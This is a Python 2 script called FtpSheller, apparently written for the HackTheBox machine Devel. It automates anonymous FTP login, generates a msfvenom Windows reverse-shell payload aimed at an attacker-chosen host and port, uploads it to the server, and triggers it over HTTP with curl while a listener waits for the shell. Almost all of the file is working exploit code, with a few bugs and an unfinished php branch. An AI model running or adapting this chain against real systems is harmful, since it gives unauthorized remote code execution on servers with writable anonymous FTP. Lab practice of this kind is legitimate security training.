#/usr/bin/env python
__author__ = 'Cowonaboat'


import ftplib
import string
import sys
import time
import subprocess
import socket
import argparse
import string
import random
import os

'''
This script will check if anonymous login is enabled, and if it is it'll
try to upload a payload. It'll then trigger the payload and return the shell

It's specifically made for the HTB box Devel from www.hackthebox.eu

####### TODO: ################
   1. Include nc1 listener in this script and do multithreading
   2. Automate msfvenom creation and add support for asp and php
   3. Finish the tun0/eth0 subprocess thingy.. perhaps
   4. Make ReadMe
   5. Clean up this mess


'''

class Attack(object):
    def __init__(self, args):
        self.rhost = args.rhost
        self.lhost = args.lhost
        self.lport = args.lport
        self.payloadType = args.payloadType # asp, aspx, php
        self.payloadName = ''.join(random.choice(string.ascii_lowercase) for x in range(8))
	self.payload = self.payloadName + "." + self.payloadType
        self.anonLogin(self.rhost)

    def anonLogin(self, rhost):
        try:
            ftp = ftplib.FTP(self.rhost)
            ftp.login('anonymous', 'derpiderp')
            print '\n[*] ' + str(self.rhost) +\
                ' FTP Anonymous Logon Succeeded.'
            self.uploadPayload(self.rhost)
        except Exception, e:
            print '\n[-] ' + str(self.rhost) +\
                ' FTP Anonymous Logon Failed.'
            return False

    def payloadCreate(self):
       print '[~] Creating payload'
       with open(self.payload, 'wb') as out:
           p = subprocess.Popen(["msfvenom", "-p", "windows/shell_reverse_tcp", "LHOST={}".format(self.lhost), "LPORT={}".format(self.lport), "-f", self.payloadType], stdout = out, stderr = subprocess.PIPE)
           p.wait()

    def uploadPayload(self, rhost):
        try:
            ftp = ftplib.FTP(self.rhost)
            ftp.login('anonymous', 'derpiderp')
            if self.payloadType.lower() is not 'php':
                try:
                    self.payloadCreate()
		except Exception, e:
		    print '[!] Error creating payload!'
            else:
                try:
                    subprocess.call(["msfvenom", ""]) # TODO
		except Exception, e:
		    print '[!] Error creating payload!'
            ftp.storbinary('STOR {}'.format(self.payload), open(self.payload, 'rb'))
            print '[+] Payload uploaded!'
            ftp.quit()
            os.remove(self.payload)
            self.activate(self.rhost, self.payload)
        except Exception, e:
            print '[!] Error uploading payload, it seems that there is no write permissions for anonymous, exiting..'
            sys.exit(0)

    def activate(self, rhost, payload):
        try:
	    import threading
	    from subprocess import call
            def listener():
                call(['python', 'nc1.py', '-l', str(self.lhost), self.lport])
	    processThread = threading.Thread(target=listener)
	    processThread.start()
	    print '[+] Successfully started listener'
            hostname = self.rhost + "/" + self.payload
            curl = subprocess.Popen(["curl", "-k", hostname], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            print '[+] Triggered payload!'
        except Exception, e:
            print '[!] Error triggering payload at ' + str(hostname)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
            description = 'FtpSheller')
    parser.add_argument('--rhost', help = 'Remote host')
    parser.add_argument('--lhost', help = 'Local host listener')
    parser.add_argument('--lport', help = 'Local port listener')
    parser.add_argument('--payloadType', help = 'Type of payload (asp, aspx, php')
    args = parser.parse_args()
    Attack(args)
